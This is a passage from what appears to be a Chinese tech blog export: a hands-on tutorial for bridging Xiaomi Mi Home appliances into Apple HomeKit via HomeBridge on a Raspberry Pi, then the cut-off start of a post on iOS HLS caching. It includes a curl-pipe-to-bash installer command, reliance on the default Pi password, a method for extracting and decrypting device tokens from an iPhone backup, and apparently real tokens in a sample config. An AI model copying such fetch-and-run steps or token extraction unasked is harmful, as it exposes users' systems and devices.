上智能控制，就不用一下子離開去開燈、一下子去開電鍋…等等，很浪費時間。之前寫過一篇「 智慧家居初體驗 — ...", "content": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKitphoto by picjumbo.com關於因為疫情的關係，在家時間變長了；尤其是要 Work From Home 的話，家裡的電器設備最好都能在 APP 上智能控制，就不用一下子離開去開燈、一下子去開電鍋…等等，很浪費時間。之前寫過一篇「 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 」 ，初試使用 HomeBridge 將小米家電串上 HomeKit，實證理論上可行，但實際應用提到的不多，今天這篇算是綜合前篇的進階完整版，包含選擇樹莓派當主機的話該怎麼設定，從頭到尾手把手教學。起因是最近換了 iPhone 11 Pro 能支援 iOS ≥ 13 捷徑的 NFC 自動化功能，就是手機感應到 NFC Tag 就能執行相應的捷徑；雖然 可以直接拿舊的悠遊卡當 NFC Tag ，但太占空間也沒那麼多張卡；我去光華問了一圈都沒有再賣 NFC Tag 感應貼紙，最後才在蝦皮找到 $50 一張，買了 5 張來玩玩，賣家還很貼心的幫我用顏色區隔開。*NFC 自動化功能是綁機型的，只有 iPhone XS/XS max/XR/11/11pro/11pro max 支援這個功能，之前拿 iPhone 8 完全沒 NFC這選項。稍微把玩了一下發現有個問題，就是執行米家 APP 的捷徑時一定要打開「執行時顯示」選項（否則不會真的執行）， 感應到 Tag 要執行時還要解鎖 iPhone 、執行時也會開啟捷徑，無法在後台直接感應執行 ；另外實測了如果捷徑是原生蘋果的服務（如：HomeKit 的家電）就能在背景&amp;免解鎖下直接執行；而且 homeKit 的反應速度、穩定度都比米家好很多。這在爽度上有很大的差別，所以就又深入研究了將米家智慧家居系列的產品都接上 HomeKit，有支援 HomeKit 的就直接綁定本篇不贅述；不支援的就照此文教學也一起綁定上去！我的米家智慧家居項目 米家智慧攝影機 雲台版 1080P 米家直流變頻電風扇 米家 LED 智慧檯燈 小米空氣淨化器 3 米家檯燈 Pro（本身就支援 HomeKit） 米家 LED 智慧燈泡 彩光版 * 2 （本身就支援 HomeKit）運作原理做了一張簡易的參考圖，如果智慧家電有支援 HomeKit 就直接串上去、 不支援的智慧家電透過架設「HomeBridge」服務主機（要一直開機）也能橋接串上去 ；在同一個網路環境下（EX: 同個 WiFi）iPhone 可以自由地控制 HomeKit 中的所有家電項目；但若在外部網路，如 4G 行動網路情況下，就需要有一台 Apple TV/HomePod 或 iPad 當家庭中樞主機，在家待命（一樣要一直開著） 才能在外面控制家中的 HomeKit，若無家庭中樞在外面打開家庭 APP 會顯示「 無回應 」。 *若是米家的話，會經由米家伺服器控制家裡的電器，要說的話 會有安全問題，資料都要經過大陸 。需求環境所以一共有兩個設備要一直開著待命，一台是 Apple TV/HomePod 或 iPad 家庭中樞主機；這部分目前無解，無法用其他方式模擬，只能想辦法取得這些設備，如果沒有就只能在家使用 HomeKit 。另一台只要是能 24 hr 待命的電腦（如您的 iMac/MacBook）、閒置的主機（舊的 iMac、Mac Mini）或樹莓派都可以。 *windows 系列未嘗試，不過應該也可以！亦或是你想玩玩也可以直接用目前的電腦來用（可搭配 前篇文章 一起服用）。本文將以樹莓派（Raspberry Pi 3B）、使用 Macbook Pro (MacOS 10.15.4) 操作下作示範，從設定樹莓派的環境從頭開始講；若不是使用樹莓派的朋友可以直接略過跳到 HomeBridge 串接 HomeKit 的部分（這裡都一樣）。Raspberry Pi 3B (special thanks to Lu Xun Huang )若是使用樹莓派還需要一張 micro SD 記憶卡（不用太大，我用 8G）、讀卡機、網路線（設定用，之後可連 WiFi）；還有樹莓派需要的軟體： 樹莓派桌面版作業系統（方便大家入門，使用 GUI 版） Etcher 燒錄軟體樹莓派環境設定燒錄作業系統下載完需求的兩個軟體後，我們先將記憶卡放入讀卡機插上電腦；打開 Etcher 程式（balenaEtcher）第一項選擇剛下載的樹莓派作業系統「xxxx.img」、第二項選擇你的記憶卡裝置，然後點擊「Flash!」開始燒錄！此時會跳出要你輸入 MacOS 的密碼 ，輸入後按「Ok」繼續。燒錄中…請稍候….驗證中…請稍候….燒錄成功！ *若有出現紅色的 Error ，可嘗試將記憶卡格式化後再次燒錄。重新將讀卡機接上電腦，並在記憶卡內容目錄下建立一個空的 「ssh」 檔案（ 或點此下載 ）內容空白、不用副檔名，就是個「ssh」檔；讓我們可以用 Terminal 連線進樹莓派。ssh設定樹莓派將記憶卡退出，插入樹莓派上並接上網路線，然後通電開機；並讓 MacBook 跟樹莓派在同個網路環境下。查看樹莓派分配到的 IP 位置得到 樹莓派分配到的 IP 位置是： 192.168.0.110 (本文所有出現的 IP 請自行更換成你查到的結果) 建議將樹莓派設定為指定/保留 IP，否則開機重連後 IP 位置可能會變動，要重新查。使用 SSH 連入樹莓派進行操作打開 Terminal 輸入：ssh pi@你的樹莓派IP位址有詢問就輸入 yes ，密碼輸入預設密碼： raspberry連線成功！ *若有出現 WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED 之類的錯誤訊息就先去 /Users/xxxx/.ssh/known_hosts 用文字編輯器打開清空即可樹莓派基本工具安裝、設定 輸入以下指令安裝 Vim 編輯器：sudo apt-get install vim2.解決以下語系警告：perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_LANG = \"zh_TW.UTF-8\", LANG = \"zh_TW.UTF-8\" are supported and installed on your system.perl: warning: Falling back to the standard locale (\"C\").輸入vi .bashrc按「Enter」進入按「 i 」進入編輯模式移動到文件最底部，加上一行「 export LC_ALL=C 」按「Esc」輸入「 :wq! 」儲存退出。再下「 source .bashrc 」更新即可。3.安裝 nvm 管理 nodejs/npm：curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash4.用 nvm 安裝最新版 nodejs ：nvm install 12.16.2 *這邊選擇安裝「12.16.2」版本5.確認環境安裝完成：輸入以下指令npm -v和node -v確認沒錯誤訊息即可！6.建立 nodejs 連結輸入以下指令which node取得 nodejs 所在路徑資訊再輸入sudo ln -fs 這邊貼上你 which node 查到的路徑(不用\"雙引號) /usr/local/bin/node建立連結設定完成！啟用樹莓派 VNC 遠端桌面功能這邊我們雖然是裝 GUI 版，你當然可以直接將樹莓派接上鍵盤、HDMI 當一般電腦使用，但為了方便我們將使用遠端桌面的方式控制樹莓派。輸入：sudo raspi-config進入設定：選擇第五項「 Interfacing Options 」選擇第三項「 P3 VNC 」使用 「 ← 」選擇「 Yes 」打開VNC 遠端桌面功能啟用成功！使用 「 → 」直接切到「 Finish 」退出設定介面。將 VNC 遠端桌面服務加入到開機自動啟動項我們希望 VNC 遠端桌面服務是樹莓派開機後就自動啟用的。輸入sudo vim /etc/init.d/vncserver按「Enter」進入按「 i 」進入編輯模式#!/bin/sh### BEGIN INIT INFO# Provides: vncserver# Required-Start: $local_fs# Required-Stop: $local_fs# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start/stop vncserver### END INIT INFO# More details see:# http://www.penguintutor.com/linux/vnc### Customize this entry# Set the USER variable to the name of the user to start vncserver underexport USER='pi'### End customization requiredeval cd ~$USERcase \"$1\" in start) su $USER -c '/usr/bin/vncserver -depth 16 -geometry 1024x768 :1' echo \"Starting VNC server for $USER \" ;; stop) su $USER -c '/usr/bin/vncserver -kill :1' echo \"vncserver stopped\" ;; *) echo \"Usage: /etc/init.d/vncserver {start|stop}\" exit 1 ;;esacexit 0「Commend」＋「C」、「Commend」＋「V」複製貼上以上內容進去，按「Esc」輸入「:wq!」儲存退出。再輸入：sudo chmod 755 /etc/init.d/vncserver修改文件權限。再輸入：sudo update-rc.d vncserver defaults加入到開機自動啟動項目。最後輸入：sudo reboot重新啟動樹莓派。 *重新啟動完成後，再照之前的步驟重新使用 ssh 連線進來。使用 VNC Client 進行連線：這邊使用的是 Chrome 的 APP 「 VNC® Viewer for Google Chrome™ 」，安裝完啟動後，輸入 樹莓派 IP 位置:1 ，請注意後面的 Port:1 要加上！ *我使用 Mac 自帶的 VNC:// 無法連線，不確定原因。點選「 Connect 」。點選「 ＯＫ 」。輸入登入帳號密碼 ，同 SSH 連線，帳號 pi 預設密碼 raspberry 。成功連入！完成樹莓派初始化設定：再來都是圖形介面！很容易！設定語言、地區、時區。更改樹莓派預設密碼，輸入你要設定的密碼。直接下一步「 Next 」。設定使用 WiFi 連線，之後就不用在插線了。 *但請注意樹莓派 IP位置可能會改變，要再進路由器查詢是否要更新當前作業系統，不趕時間就選「 Next 」更新吧！ *更新大約需要20~30分鐘（依照你的網路速度）更新完成後，點擊「 Restart 」重新啟動。樹莓派環境設定完成！HomeBridge 安裝正式進入重頭戲，安裝使用 HomeBridge。使用Terminal ssh 連線進樹莓派或直接使用 VNC 遠端桌面裡的 Terminal。輸入：npm -g install homebridge - unsafe-perm^( 不加 sudo )安裝 HomeBridge安裝完成！建立/修改設定檔(config.json)：為了方便編輯，使用 VNC 遠端桌面連線至樹莓派 (也可直接用指令) ：點左上角打開「 檔案管理程式 」-&gt; 進入「 /home/pi/.homebridge 」若沒看到「config.json」檔案則在空白處點右鍵「 New File 」-&gt; 輸入檔案名稱「 config.json 」在「 config.json 」上按右鍵用「 Text Editor 」打開貼上以下基礎設定內容：{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\"}內容不用特別更改，直接照搬即可！ 記得存檔！完成！綁定 HomeBridge 到 Homekit輸入：homebridge start^( 不加 sudo )啟用 *若出現 Error: Service name is already in use on the network / port被佔用之類的錯誤可嘗試砍掉服務、改用 homebridge restart 重啟、或重新開機。 *若出現was not registered by any plugin之類的錯誤則代表你還沒有安裝相應的homebridge plugin。 啟動中有更改 設定檔(config.json)內容的話要改下： sudo homebridge restart 重新啟動 HomeBridge *按「Control」+「C」可在 Terminal 關閉退出 HomeBridge 服務。拿出 iPhone 打開「家庭」APP，在「家庭」右上角點「+」，選「加入配件」， 掃描你出現的 QRCode 。這時應該會出現「 找不到配件 」，別擔心！因為我們還沒有加入任何配件到 HomeBridge 橋接器上，沒關係，讓我們繼續往下看。至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ： 至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ： 至少要有一個配件才能掃描加入! ! ! (這邊以攝影機為範例) ：第一次掃描加入會出現警告視窗，按「強制加入」即可！ 加入過一次後，後面再新增的配件都不用再次掃描了，會自己更新進去！將 HomeBridge 服務加入樹莓派開機自動啟動項目同 VNC 遠端桌面服務，我們也希望 HomeBridge 服務是樹莓派開機後就自動啟用的，不然一但重開機就要再次手動連進來啟用。輸入：which homebridge取得 homebridge 路徑資訊記下此路徑。再輸入：sudo vim /etc/init.d/homebridge按「Enter」進入按「 i 」進入編輯模式#!/bin/sh### BEGIN INIT INFO# Provides:# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start daemon at boot time# Description: Enable service provided by daemon.### END INIT INFOdir=\"/home/pi\"cmd=\"DEBUG=* 這邊貼上你 which homebridge 查到的路徑\"user=\"pi\"name=`basename $0`pid_file=\"/var/run/$name.pid\"stdout_log=\"/var/log/$name.log\"stderr_log=\"/var/log/$name.err\"get_pid() {cat \"$pid_file\"}is_running() {[ -f \"$pid_file\" ] &amp;&amp; ps -p `get_pid` &gt; /dev/null 2&gt;&amp;1}case \"$1\" instart)if is_running; thenecho \"Already started\"elseecho \"Starting $name\"cd \"$dir\"if [ -z \"$user\" ]; thensudo $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;elsesudo -u \"$user\" $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;fiecho $! &gt; \"$pid_file\"if ! is_running; thenecho \"Unable to start, see $stdout_log and $stderr_log\"exit 1fifi;;stop)if is_running; thenecho -n \"Stopping $name..\"kill `get_pid`for i in 1 2 3 4 5 6 7 8 9 10# for i in `seq 10`doif ! is_running; thenbreakfiecho -n \".\"sleep 1doneechoif is_running; thenecho \"Not stopped; may still be shutting down or shutdown may have failed\"exit 1elseecho \"Stopped\"if [ -f \"$pid_file\" ]; thenrm \"$pid_file\"fifielseecho \"Not running\"fi;;restart)$0 stopif is_running; thenecho \"Unable to stop, will not attempt to start\"exit 1fi$0 start;;status)if is_running; thenecho \"Running\"elseecho \"Stopped\"exit 1fi;;*)echo \"Usage: $0 {start|stop|restart|status}\"exit 1;;esacexit 0將：cmd=”DEBUG=* 這邊貼上你 which homebridge 查到的路徑”替換入你查到的路徑資訊（不用“雙引號）「Commend」＋「C」、「Commend」＋「V」複製貼上以上內容進去，按「Esc」輸入「:wq!」儲存退出。再輸入：sudo chmod 755 /etc/init.d/homebridge修改文件權限。最後輸入：sudo update-rc.d homebridge defaults加入到開機自動啟動項目。完成！ 可直接使用 sudo /etc/init.d/homebridge start 啟用 homebridge 服務。 另可使用： tail -f /var/log/homebridge.err 查看啟動錯誤訊息、 tail -f /var/log/homebridge.log 查看 log 。米家智慧家電串接前準備Homebridge on 起來後，我們就可以開始逐個將所有米家家電加入至 Homebridge 接上 homeKit！首先我們要先將米家智慧家電都加入「 米家APP 」 ，我們要從其中獲取串接上 HomeBridge 的資訊。智慧家電都加入米家 APP 後：將 iPhone 接上 Mac 電腦，打開 Finder/Itunes 介面，選擇接上的手機選備份到「 這部電腦 」、 「 不要勾！替本機備份加密」 ，點「 立即備份 」備份完成後， 下載 安裝備份查看軟體： iBackupViewer打開「 iBackupViewer 」 初次啟動會要你去 Mac「系統偏好設定」- 「安全性與隱私權」-「隱私權」-「+」- 加入「iBackupViewer」 *如有隱私顧慮可關閉網路使用這套軟體、並在使用後移除再次打開「 iBackupViewer 」成功讀取到備份檔後，點擊「剛備份的手機」選擇「 App Stroe 」Icon左方找到「米家 APP (MiHome.app)」-&gt; 右方找到「 數字_mihome.sqlite」 這個檔案並「 選擇 」 -&gt; 右上角「 Export 」-&gt; 「 Selected Files 」 *若有兩個 「數字_mihome.sqlite」檔案，則挑 Created 建立時間最新的來用。將剛剛匯出的 數字_mihome.sqlite 檔案 拖曳進這個網站查看內容：可將查詢語法換成：SELECT `ZDID`,`ZNAME`,`ZTOKEN` FROM 'ZDEVICE' LIMIT 0,30僅顯示我們需要的欄位資訊 （若有特別的家電套件需要其他的欄位資訊也可以加上去做篩選） ZDID: 裝置 ID ZNAME: 裝置名稱 ZTOKEN: 裝置 ZToken ZTOKEN 不能直接用，要轉換成 “Token” 才能使用。這邊以攝影機的 ZToken 轉換 Token 為例：首先，我們從上面列表取得攝影機的 ZToken 欄位內容7f1a3541f0433b3ccda94beb856c2f5ba2b15f293ce0cc398ea08b549f9c74050143db63ee66b0cdff9f69917680151e但這邊拿到的 TOKEN 還不能用，我們還需要將他轉換打開 http://aes.online-domain-tools.com/ 這個網站： 將剛剛複製出來的 ZTOKEN 貼在「Input Text」，選「Hex」 Key輸入「00000000000000000000000000000000」32個0，ㄧ樣選「Hex」 然後按下「Decrypt!」轉換 全選複製右下角兩行的輸出內容＆去掉空格後就是我們要的結果 Token「 6d304e6867384b704b4f714d45314a34 」就是我們要的 Token 結果！ *Token 去得方式這塊有嘗試用「miio」直接嗅探的方式，但好像是米家韌體有更新過，已無法用這個方法快速方便得到 Token 了！最後，我們還要知道 裝置的 IP 位址 (這邊一樣以攝影機為例)：打開米家APP → 攝影機 → 右上角「…」→設定→網路訊息，得到 IP位址 ！ 記錄下 ZDID/Token/IP 這些資訊，供後續使用。將米家智慧家電逐個串入 HomeBridge依照個別裝置需要用到的套件、連線資訊不同，逐個安裝、設定，加入至 HomeBridge。 再來打開 Terminal ssh 連線進樹莓派或直接使用 VNC 遠端桌面裡的 Terminal，繼續後續作業….1.米家攝影機雲臺版：在 Terminal 下命令安裝 MijiaCamera 這個 homebridge 套件 ( 不加 sudo )：npm install -g homebridge-mijia-camera參考前文的修改設定檔(config.json)教學，在檔案中加入 accessories 區塊 ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}accessories: 加入米家攝影機的設定資訊，ip 帶入攝影機 ip、token 帶入帶入前文教學教的 token 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：攝影機開/關2.米家直流變頻電風扇在 Terminal 下命令安裝 homebridge-mi-fan 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-mi-fan參考前文的修改設定檔(config.json)教學，在檔案中加入 platforms 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"\", \"token\":\"\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] } ]}platforms: 加入米家電風扇設定資訊，ip 帶入攝影機 ip、token 帶入前文教學教的 token、humidity/temperature 可控制是否連動顯示溫濕度計資訊、type 需帶入對應型號的文字 ，支援四種不同型號的電風扇： 智米直流變頻落地扇：ZhiMiDCVariableFrequencyFan 智米自然風風扇：ZhiMiNaturalWindFan 米家直流變頻：MiDCVariableFrequencyFan (台灣賣的) 米家風扇：DmakerFan請自行帶入自己的風扇型號。 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：電風扇開/關、風力大小調整3.小米空氣淨化器 3在 Terminal 下命令安裝 homebridge-xiaomi-air-purifier3 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-xiaomi-air-purifier3參考前文的修改設定檔(config.json)教學，在檔案中加入 accessories 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"\", \"ip\":\"\", \"token\":\"\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ]}accessories: 加入米家電風扇設定資訊，ip 帶入攝影機 ip、token 帶入前文教學教的 token、did 帶入 zdid 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：空氣清淨機開關、風力大小調整可查看項目：當前溫濕度4.米家 LED 智慧檯燈在 Terminal 下命令安裝 homebridge-yeelight-wifi 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-yeelight-wifi參考前文的修改設定檔(config.json)教學，在檔案中加入 platforms 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}不用特別帶什麼參數進去！若要做更細節的設定可參考 官方文件 (如亮度/色溫…) 記得存檔！智慧檯燈還需改綁定到「 Yeelight 」APP，然後將「區域網路控制」打開才能給 Homebridge 控制。1.在 iPhone 上下載安裝「 Yeelight 」APPApp Store 搜尋「Yeelight」安裝安裝完打開 Yeelight APP -&gt; 「增加裝置」-&gt; 找到「米家檯燈」-&gt; 重新配對綁定最後一步記得打開「 區域網路控制 」 *如果不小心沒點到打開，可以在「裝置」頁 -&gt; 選檯燈裝置進入 -&gt; 點右下角「△」Tab -&gt; 點「局域網控制」進入設定 -&gt; 打開區域網路控制 吐槽一下這個真的有夠爛，米家本身的 APP 沒有此開關功能，一定要綁到 Yeelight APP，也不能解綁或重綁回米家…否則會失效。然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：燈開關、色溫調整、亮度調整其他米家智慧家電 homebridge 套件：我最終的 config.json 長這樣：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"192.168.0.105\", \"token\":\"6d304e6867384b704b4f714d45314a34\" }, { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"270033668\", \"ip\":\"192.168.0.108\", \"token\":\"5c3eeb03065fd8fc6ad10cae1f7cce7c\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ], \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"192.168.0.106\", \"token\":\"dd1b6f582ba6ce34f959bbbc1c1ca59f\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] }, { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}給大家做參考！我有用到的米家家電如上教學，其他我沒有的就沒去試了，大家可以自己 上 npm 查詢（homebridge-plugin XXX英文名稱） ，然後照上面邏輯大同小異安裝、設定串接上去！這邊附上幾個我找到但沒試過的 homebridge 套件(不保證能用)： 小米空氣清淨機1代： homebridge-mi-air-purifier 米家智能插座系列： homebridge-mi-outlet 小米掃地機器人： homebridge-mi-robot_vacuum 米家智能網關： homebridge-mi-aqara小叮嚀 建議到路由器將所有米家家電設定為指定/保留 IP，否則 IP 位置可能會變動，要重新更改 config.json 設定。 如果發現步驟都對但就是串不起來出現錯誤或是在 HomeKit 上一直顯示「無回應」，可以重新嘗試看看；如果還是一樣可能代表套件已失效，要找其他的套件來串接了。(可查看 github issue) 功能失效、反應慢；這個也無解，可以發 issue 告知作者等作者更新，由於是開源專案，不可要求太多了! 綁定完每個家電，都可以啟動一次 Homebridge，再回到 iPhone 上看能不能運作，能的話可以再下「Controle」＋「C」終止；當全部家電都綁定好後，可重新啟動樹莓派，讓他在重啟後自己在後台啟動 homebridge 服務；這才是我們要的。結語另外可以在「設定」-&gt;「控制中心」-&gt;「自訂」中將「家庭」APP 拉上去就能在下拉控制中心中快速操作 HomeKit !全部串上 HomeKit 後只有一個字「爽」！開關的反應更快，只差我沒有家庭中樞沒辦法遠端控制而已，此篇進階 Homebridge 也到此結束，感謝閱讀。回到文章開頭，全都加入 HomeKit 後我們就可以無痛使用 iOS ≥ 13的捷徑自動化功能了。之後再想要來研究 homebridge 套件是怎麼做的？感覺很有趣呢！所以如果有 HomeBridge 套件不合你的操作需求、有套件壞了找不到替代的，就在等我去研究吧！Home assistant還有另一個智慧家庭的平台 Homeassistant 可以刷入樹莓派使用（ 但請注意：需要 2A 的電源才有辦法啟動 ）； Homeassistant 我也有灌來玩玩看，全 GUI 圖型操作，點一點就能串入家電；之後再來深入研究，感覺他等同於另一個米家平台而已，如果有很多不同廠商的 IOT 元件，更適合使用這個。參考資料 https://www.domoticz.cn/forum/viewtopic.php?t=52 https://or2.in/2017/07/02/Homekit-and-MiJia-with-pi/#3-%E5%8F%B7%E5%A4%96-%E5%BC%80%E5%90%AF%E5%8F%AF%E8%A7%86%E5%8C%96VNC延伸閱讀 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學）有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 7,410 Total Views Last Statistics Date: 2025-08-15 | 7,378 Views on Medium." }, { "title": "iOS HLS Cache 實踐方法探究之旅", "url": "/posts/zrealm-dev/ios-hls-cache-%E5%AF%A6%E8%B8%90%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6%E4%B9%8B%E6%97%85-d796bf8e661e/", "categories": "ZRealm Dev.", "tags": "hls, ios, ios-app-development, cache, reverse-proxy", "date": "2020-04-09 01:12:17 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS HLS Cache 實踐方法探究之旅使用 AVPlayer 播放 m3u8 串流影音檔時如何做到邊播放邊 Cache 的功能photo by Mihis Alex[2023/03/12] Update 下篇「 AVP...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS HLS Cache 實踐方法探究之旅使用 AVPlayer 播放 m3u8 串流影音檔時如何做到邊播放邊 Cache 的功能photo by Mihis Alex[2023/03/12] Update 下篇「 AVPlayer 實踐本地 Cache 功能大全 」教您實現 AVPlayer Caching我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以用 PINCache or 其他… 外部只需呼叫 make AVAsset 工廠，帶入 URL，則 AVAsset 就能支援 Caching 使用 Combine 實現 Data Flow 策略 寫了一些測試關於HTTP Live Streaming (簡稱HLS) 是蘋果提出基於HTTP的串流媒體網絡傳輸協議。以播放音樂來說，非串流情況下我們使用 mp3 作為音樂檔，這個檔案有多大就要花多久時間全部下載下來才能播放；而 HLS 就是把一個檔案分割成多個小檔案，讀到哪播到哪，所以拿到第一個分割區塊就能開始播放，不用整個都下載完！.m3u8 檔就是紀錄這些分割的 .ts 小檔案的碼率、播放順序、時間 還有整個音訊的資訊，另外也可以做加解密保護、低延遲直播…等等.m3u8 檔範例(aviciiwakemeup.m3u8)：#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-TARGETDURATION:10#EXT-X-MEDIA-SEQUENCE:0#EXTINF:9.900411,aviciiwakemeup–00001.ts#EXTINF:9.900400,aviciiwakemeup–00002.ts#EXTINF:9.900411,aviciiwakemeup–00003.ts#EXTINF:9.900411,...#EXTINF:6.269389,aviciiwakemeup-00028.ts#EXT-X-ENDLIST*EXT-X-ALLOW-CACHE 已在 iOS≥ 8/Protocol Ver.7 deprecated ，有沒有這行都沒有用意義了。目標對於一個影音串流服務， Cache 非常之重要 ；因為每個音訊檔案小則 MB 大則幾 GB ，如果每次重播都要再從伺服器拉一次檔案，對 Server 的 Loading 來說非常吃力，而且流量都是 \\(\\) ，如果有個 Cache 層能為服務節省許多金錢，對使用者來說也不用浪費網路、浪費時間重新下載；是一個雙贏的機制 (但要記得設定上限/定時清除，避免把使用者的設備塞爆)。問題以往非串流時 mp3/mp4 沒什麼好處理的，就是在播放前先下載到設備上，下載完成才開始播放；反正不管怎樣都要載完才能播，那不如我們自己用 URLSession 下載完檔案後再餵 file:// 下載在本地的檔案路徑給 AVPlayer 做播放即可；或正規方式，使用 AVAssetResourceLoaderDelegate 在 Delegate 方法中對下載的資料進行 Cache 緩存。遇到串流想法其實也很直白，就是先讀 .m3u8 檔，然後在解析裡面的資訊，對每個 .ts 檔做 Cache 即可；但實作發現事情沒有這麼簡單，處理難度超乎我的想像，所以才會有此篇文章！播放部分我們一樣直接使用 iOS AVFoundation 的 AVPlayer，在操作上串流/非串流檔案沒有差異。Example:let url:URL = URL(string:\"https://zhgchg.li/aviciiwakemeup.m3u8\")var player: AVPlayer = AVPlayer(url: url)player.play()2021–01–05 更新：我們退而求其次退回去使用 mp3 檔，這樣就能直接使用 AVAssetResourceLoaderDelegate 進行實作，詳細實作可參考「 AVPlayer 邊播邊 Cache 實戰 」。實踐方案針對我們的目標能達成的幾個方案及實踐時遇到的問題。方案 1. AVAssetResourceLoaderDelegate ❌第一個想法就是，那我們就照 mp3/mp4 時的做法就好啦！一樣用 AVAssetResourceLoaderDelegate 在 Delegate 方法中緩存 .ts 檔案。不過很抱歉，此路不通，因為無法在 Delegate 中攔截到 .ts 檔案的下載請求資訊，可以在這則 問答 和 官方文件 上確切此事。AVAssetResourceLoaderDelegate 實作可參考「 AVPlayer 邊播邊 Cache 實戰 」。方案 2.1 URLProtocol 攔截請求 ❌URLProtocol 也是最近才學到的方法，所有基於 URL Loading System 的請求 (URLSession、Call API、下載圖片…) 都可以被我們攔截下來修改 Request、Response 然後再返回，一切就像沒發生一樣，偷偷來；關於 URLProtocol 可以參考 此篇文章 。應用此方法，我們打算攔截 AVFoundation AVPlayer 在要求 .m3u8 、 .ts 的請求時，攔截下來然後如果本地有 Cache 就直接返回 Cache Data，沒有則再真的再發 Request 出去；這樣也能達到我們的目標。一樣，很抱歉，此路也不通；因為 AVFoundation AVPlayer 的請求不是在 URL Loading System 上，我們無從攔截。*有一說是 模擬器上可以但實機上不行方案 2.2 暴力讓他能進 URLProtocol ❌根據 方案 2.1 腦洞大開的暴力法，如果我把請求網址換成一個自訂的 Scheme (EX: streetVoiceCache://)，因 AVFoundation 無法處理這個請求，所以會丟出來，這樣我們的 URLProtocol 就能攔截到，做我們想做的事。let url:URL = 